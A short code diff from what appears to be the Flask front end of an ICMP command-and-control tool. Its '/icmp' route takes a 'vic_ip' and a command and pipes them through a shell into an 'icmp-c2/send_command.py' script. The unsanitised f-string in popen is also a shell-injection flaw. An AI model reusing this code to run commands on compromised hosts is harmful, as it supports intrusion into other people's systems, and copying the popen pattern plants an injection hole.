@@ -23,7 +23,6 @@ def processd():
 
 @app.route("/icmp", methods=["POST"])
 def icmp():
-    # Does nothing with return port
     vic_ip = request.json['vic_ip']
     command = request.json['command']
     with popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}") as f:
